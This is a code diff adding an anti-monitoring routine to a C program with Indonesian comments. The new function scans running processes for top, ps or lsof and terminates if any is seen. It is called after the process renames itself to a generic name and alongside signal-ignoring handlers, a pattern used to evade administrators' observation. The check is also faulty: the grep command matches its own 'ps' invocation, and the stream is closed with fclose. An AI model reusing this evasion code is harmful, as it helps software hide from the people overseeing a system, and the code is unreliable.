@@ -8,6 +8,26 @@
 #include <sys/prctl.h>
 #include <sys/stat.h>  
 #include <sys/wait.h>
+
+
+void check_monitoring_tools() {
+    FILE *fp;
+    char command[256];
+    
+    // Cek jika ada proses ps atau top yang sedang berjalan
+    fp = popen("ps aux | grep -E 'top|ps|lsof'", "r");
+    if (fp != NULL) {
+        while (fgets(command, sizeof(command), fp) != NULL) {
+            if (strstr(command, "top") || strstr(command, "ps") || strstr(command, "lsof")) {
+                // Jika ditemukan ps, top, atau lsof, lakukan sesuatu
+                printf("Alat pemantau terdeteksi! Menghentikan proses...\n");
+                _exit(0);
+            }
+        }
+        fclose(fp);
+    }
+}
+
 // Fungsi untuk mengabaikan sinyal
 void signal_ignore(int sig) {
     (void)sig;
@@ -160,6 +180,7 @@ int perintahSembilan() {
 
 int main() {
 	prctl(PR_SET_NAME, (unsigned long)"process", 0, 0, 0);
+	check_monitoring_tools();
 	setup_signal_handlers();
     if (perintahSatu() != 0) {
     }
